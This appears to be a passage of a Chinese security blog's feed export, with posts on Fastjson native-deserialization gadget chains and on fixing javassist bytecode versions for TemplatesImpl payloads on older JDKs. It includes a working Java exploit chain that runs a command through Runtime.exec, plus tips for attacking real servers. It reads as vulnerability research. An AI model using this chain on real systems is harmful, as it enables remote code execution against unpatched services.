class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Y4HackJSON</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] genPayload(String cmd) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        CtClass superClass = pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        CtConstructor constructor = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        clazz.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;genPayload(<span class="string">&quot;open -na Calculator&quot;</span>)&#125;);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        JSONArray jsonArray = <span class="keyword">new</span> JSONArray();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException bd = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        setValue(bd,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(templates,bd);</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用TemplatesImpl执行字节码在实战中的踩坑记录</title>
      <link href="/2023/04/25/year/2023/4/%E5%88%A9%E7%94%A8TemplatesImpl%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81%E5%9C%A8%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/04/25/year/2023/4/%E5%88%A9%E7%94%A8TemplatesImpl%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81%E5%9C%A8%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="利用TemplatesImpl执行字节码在实战中的踩坑记录"><a href="#利用TemplatesImpl执行字节码在实战中的踩坑记录" class="headerlink" title="利用TemplatesImpl执行字节码在实战中的踩坑记录"></a>利用TemplatesImpl执行字节码在实战中的踩坑记录</h1><p>在平时，无论是JNDI注入，还是反序列化，只要涉及到不出网的场景，TemplatesImpl的利用就很广泛，这里记录一个在实战中遇到的踩坑记录，篇幅不多贵在记录。</p><p>假设当前服务器存在反序列化漏洞，不出网，当你兴高采烈的拿着工具去打的时候发现怎么也打不通，内存马上不去，回显也没有，这是怎么回事呢？且看下文。</p><p>既然需要使用TemplatesImpl加载字节码，那么就需要生成恶意类的Bytecode</p><p>这里我们再温习一下，最终在getTransletInstance方法处加载字节码到jvm，并调用newInstance实例化触发恶意代码的加载</p><p><img src="/2023/04/25/year/2023/4/%E5%88%A9%E7%94%A8TemplatesImpl%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81%E5%9C%A8%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/image-20230425223608324.png" alt="image-20230425223608324"></p><p>网上的各种工具，基本上都使用了javassist框架进行恶意类的生成，这里以TomcatEcho为例，大多数工具代码都类似下面的写法，创建类，添加方法，生成ByteCode</p><p><img src="/2023/04/25/year/2023/4/%E5%88%A9%E7%94%A8TemplatesImpl%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81%E5%9C%A8%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/image-20230425224758672.png" alt="image-20230425224758672"></p><p>问题就出在输出ByteCode的过程中，当调用<code>ClassPool.getDefault()</code>的过程中，会初始化ClassFile，根据某些不同版本特定存在的类来判断当前环境的<code>MAJOR_VERSION</code>(Ps:这里的反编译有点问题，从上到下ver其实是依次从49到55)，这个<code>MAJOR_VERSION</code>其实就是我们java的主版本号从49-55分别为jdk1.5到jdk11</p><p><img src="/2023/04/25/year/2023/4/%E5%88%A9%E7%94%A8TemplatesImpl%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81%E5%9C%A8%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/image-20230425224938019.png" alt="image-20230425224938019"></p><p>因此这就很有意思了，这意味着使用javassist生成的字节码的属性信息和当前java运行环境有关</p><p>假设当前服务器是一个jdk1.6跑着的tomcat服务，你拿工具打，那很显然jdk1.6并不能运行1.8版本下编译的程序，那怎么办呢？其实很简单修改这个<code>MAJOR_VERSION</code>就行，只要这个属性的数值小于或等于当前运行的java环境那就能过检查并运行</p><p>而javassist本身也提供了对应的api去帮助我们修改，比如我们需要生成1.6能运行的字节码，我们只需要在原来的基础上加上<code>clazz.getClassFile().setMajorVersion(50);</code>即可</p><p><img src="/2023/04/25/year/2023/4/%E5%88%A9%E7%94%A8TemplatesImpl%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81%E5%9C%A8%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/image-20230425230030584.png" alt="image-20230425230030584"></p><p>那如果是asm框架怎么办，就更简单了，创建类的时候在第一个输入写上对应主版本号即可</p><p><img src="/2023/04/25/year/2023/4/%E5%88%A9%E7%94%A8TemplatesImpl%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81%E5%9C%A8%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/image-20230425230127178.png" alt="image-20230425230127178"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> TemplatesImpl </tag>
            
            <tag> 踩坑记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FastJson与原生反序列化</title>
      <link href="/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="FastJson与原生反序列化"><a href="#FastJson与原生反序列化" class="headerlink" title="FastJson与原生反序列化"></a>FastJson与原生反序列化</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这其实是我很早前遇到的一个秋招面试题，问题大概是如果你遇到一个较高版本的FastJson有什么办法能绕过AutoType么？我一开始回答的是找黑名单外的类，后面面试官说想考察的是FastJson在原生反序列化当中的利用。因为比较有趣加上最近在网上也看到类似的东西，今天也就顺便在肝毕设之余来谈谈这个问题。</p><h2 id="利用与限制"><a href="#利用与限制" class="headerlink" title="利用与限制"></a>利用与限制</h2><p>Fastjson1版本小于等于1.2.48</p><p>Fastjson2目前通杀(目前最新版本2.0.26)</p><h2 id="寻找"><a href="#寻找" class="headerlink" title="寻找"></a>寻找</h2><p>既然是与原生反序列化相关，那我们去fastjson包里去看看哪些类继承了Serializable接口即可，最后找完只有两个类，JSONArray与JSONObject，这里我们就挑第一个来讲(实际上这两个在原生反序列化当中利用方式是相同的)</p><p>首先我们可以在IDEA中可以看到，虽然JSONArray有implement这个Serializable接口但是它本身没有实现readObject方法的重载，并且继承的JSON类同样没有readObject方法，那么只有一个思路了，通过其他类的readObject做中转来触发JSONArray或者JSON类当中的某个方法最终实现串链</p><p>在Json类当中的toString方法能触发toJsonString的调用，而这个东西其实我们并不陌生，在我们想用JSON.parse()触发get方法时，其中一个处理方法就是用JSONObject嵌套我们的payload</p><p><img src="/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230320134010936.png" alt="image-20230320134010936"></p><p>那么思路就很明确了，触发toString-&gt;toJSONString-&gt;get方法，</p><h2 id="如何触发getter方法"><a href="#如何触发getter方法" class="headerlink" title="如何触发getter方法"></a>如何触发getter方法</h2><p>这里多提一句为什么能触发get方法调用</p><p>因为是toString所以肯定会涉及到对象中的属性提取，fastjson在做这部分实现时，是通过ObjectSerializer类的write方法去做的提取</p><p><img src="/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230320134844206.png" alt="image-20230320134844206"></p><p>这部分流程是先判断serializers这个HashMap当中有无默认映射</p><p><img src="/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230320134927354.png" alt="image-20230320134927354"></p><p>我们可以来看看有哪些默认的映射关系</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initSerializers</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.put((Type)Boolean.class, (ObjectSerializer)BooleanCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)Character.class, (ObjectSerializer)CharacterCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)Byte.class, (ObjectSerializer)IntegerCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)Short.class, (ObjectSerializer)IntegerCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)Integer.class, (ObjectSerializer)IntegerCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)Long.class, (ObjectSerializer)LongCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)Float.class, (ObjectSerializer)FloatCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)Double.class, (ObjectSerializer)DoubleSerializer.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)BigDecimal.class, (ObjectSerializer)BigDecimalCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)BigInteger.class, (ObjectSerializer)BigIntegerCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)String.class, (ObjectSerializer)StringCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)<span class="keyword">byte</span>[].class, (ObjectSerializer)PrimitiveArraySerializer.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)<span class="keyword">short</span>[].class, (ObjectSerializer)PrimitiveArraySerializer.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)<span class="keyword">int</span>[].class, (ObjectSerializer)PrimitiveArraySerializer.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)<span class="keyword">long</span>[].class, (ObjectSerializer)PrimitiveArraySerializer.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)<span class="keyword">float</span>[].class, (ObjectSerializer)PrimitiveArraySerializer.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)<span class="keyword">double</span>[].class, (ObjectSerializer)PrimitiveArraySerializer.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)<span class="keyword">boolean</span>[].class, (ObjectSerializer)PrimitiveArraySerializer.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)<span class="keyword">char</span>[].class, (ObjectSerializer)PrimitiveArraySerializer.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)Object[].class, (ObjectSerializer)ObjectArrayCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)Class.class, (ObjectSerializer)MiscCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)SimpleDateFormat.class, (ObjectSerializer)MiscCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)Currency.class, (ObjectSerializer)(<span class="keyword">new</span> MiscCodec()));</span><br><span class="line">        <span class="keyword">this</span>.put((Type)TimeZone.class, (ObjectSerializer)MiscCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)InetAddress.class, (ObjectSerializer)MiscCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)Inet4Address.class, (ObjectSerializer)MiscCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)Inet6Address.class, (ObjectSerializer)MiscCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)InetSocketAddress.class, (ObjectSerializer)MiscCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)File.class, (ObjectSerializer)MiscCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)Appendable.class, (ObjectSerializer)AppendableSerializer.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)StringBuffer.class, (ObjectSerializer)AppendableSerializer.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)StringBuilder.class, (ObjectSerializer)AppendableSerializer.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)Charset.class, (ObjectSerializer)ToStringSerializer.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)Pattern.class, (ObjectSerializer)ToStringSerializer.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)Locale.class, (ObjectSerializer)ToStringSerializer.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)URI.class, (ObjectSerializer)ToStringSerializer.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)URL.class, (ObjectSerializer)ToStringSerializer.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)UUID.class, (ObjectSerializer)ToStringSerializer.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)AtomicBoolean.class, (ObjectSerializer)AtomicCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)AtomicInteger.class, (ObjectSerializer)AtomicCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)AtomicLong.class, (ObjectSerializer)AtomicCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)AtomicReference.class, (ObjectSerializer)ReferenceCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)AtomicIntegerArray.class, (ObjectSerializer)AtomicCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)AtomicLongArray.class, (ObjectSerializer)AtomicCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)WeakReference.class, (ObjectSerializer)ReferenceCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)SoftReference.class, (ObjectSerializer)ReferenceCodec.instance);</span><br><span class="line">        <span class="keyword">this</span>.put((Type)LinkedList.class, (ObjectSerializer)CollectionCodec.instance);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里面基本上没有我们需要的东西，唯一熟悉的就是MiscCodec(提示下我们fastjson加载任意class时就是通过调用这个的TypeUtils.loadClass)，但可惜的是他的write方法同样没有什么可利用的点，再往下去除一些不关键的调用栈，接下来默认会通过createJavaBeanSerializer来创建一个ObjectSerializer对象</p><p><img src="/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230320135558815.png" alt="image-20230320135558815"></p><p>它会提取类当中的<code>BeanInfo</code>（包括有getter方法的属性）并传入<code>createJavaBeanSerializer</code>继续处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> ObjectSerializer <span class="title">createJavaBeanSerializer</span><span class="params">(Class&lt;?&gt; clazz)</span> </span>&#123;</span><br><span class="line">    SerializeBeanInfo beanInfo = TypeUtils.buildBeanInfo(clazz, (Map)<span class="keyword">null</span>, <span class="keyword">this</span>.propertyNamingStrategy, <span class="keyword">this</span>.fieldBased);</span><br><span class="line">    <span class="keyword">return</span> (ObjectSerializer)(beanInfo.fields.length == <span class="number">0</span> &amp;&amp; Iterable.class.isAssignableFrom(clazz) ? MiscCodec.instance : <span class="keyword">this</span>.createJavaBeanSerializer(beanInfo));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法也最终会将二次处理的beaninfo继续委托给createASMSerializer做处理，而这个方法其实就是通过ASM动态创建一个类(因为和Java自带的ASM框架长的很“相似”所以阅读这部分代码并不复杂)</p><p><img src="/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230320140024393.png" alt="image-20230320140024393"></p><p>getter方法的生成在<code>com.alibaba.fastjson.serializer.ASMSerializerFactory#generateWriteMethod</code>当中</p><p>它会根据字段的类型调用不同的方法处理，这里我们随便看一个(以第一个_long为例)</p><p><img src="/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230320141614997.png" alt="image-20230320141614997"></p><p>通过<code>_get</code>方法生成读取filed的方法</p><p><img src="/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230320141732427.png" alt="image-20230320141732427"></p><p>这里的fieldInfo其实就是我们一开始的有get方法的field的集合</p><p><img src="/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230320141919458.png" alt="image-20230320141919458"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">_get</span><span class="params">(MethodVisitor mw, ASMSerializerFactory.Context context, FieldInfo fieldInfo)</span> </span>&#123;</span><br><span class="line">        Method method = fieldInfo.method;</span><br><span class="line">        <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">            mw.visitVarInsn(<span class="number">25</span>, context.<span class="keyword">var</span>(<span class="string">&quot;entity&quot;</span>));</span><br><span class="line">            Class&lt;?&gt; declaringClass = method.getDeclaringClass();</span><br><span class="line">            mw.visitMethodInsn(declaringClass.isInterface() ? <span class="number">185</span> : <span class="number">182</span>, ASMUtils.type(declaringClass), method.getName(), ASMUtils.desc(method));</span><br><span class="line">            <span class="keyword">if</span> (!method.getReturnType().equals(fieldInfo.fieldClass)) &#123;</span><br><span class="line">                mw.visitTypeInsn(<span class="number">192</span>, ASMUtils.type(fieldInfo.fieldClass));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            mw.visitVarInsn(<span class="number">25</span>, context.<span class="keyword">var</span>(<span class="string">&quot;entity&quot;</span>));</span><br><span class="line">            Field field = fieldInfo.field;</span><br><span class="line">            mw.visitFieldInsn(<span class="number">180</span>, ASMUtils.type(fieldInfo.declaringClass), field.getName(), ASMUtils.desc(field.getType()));</span><br><span class="line">            <span class="keyword">if</span> (!field.getType().equals(fieldInfo.fieldClass)) &#123;</span><br><span class="line">                mw.visitTypeInsn(<span class="number">192</span>, ASMUtils.type(fieldInfo.fieldClass));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>因此能最终调用方法的get方法</p><p>这里做个验证，这里我们创建一个User类,其中只有username字段有get方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String username;</span><br><span class="line">    <span class="keyword">public</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在asm最终生成code的bytes数据写入文件</p><p><img src="/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230320142220671.png" alt="image-20230320142220671"></p><p>可以看到在write方法当中password因为没有get方法所以没有调用getPassword，而username有所以调用了</p><p><img src="/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230320142440946.png" alt="image-20230320142440946"></p><h2 id="组合利用链"><a href="#组合利用链" class="headerlink" title="组合利用链"></a>组合利用链</h2><p>既然只能触发get方法的调用那么很容易想到通过触发TemplatesImpl的getOutputProperties方法实现加载任意字节码最终触发恶意方法调用</p><p>而触发toString方法我们也有现成的链，通过BadAttributeValueExpException触发即可</p><p>因此我们很容易写出利用链子</p><h3 id="fastjson1"><a href="#fastjson1" class="headerlink" title="fastjson1"></a>fastjson1</h3><p>Maven依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;3.19.0-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"> &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.48&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> 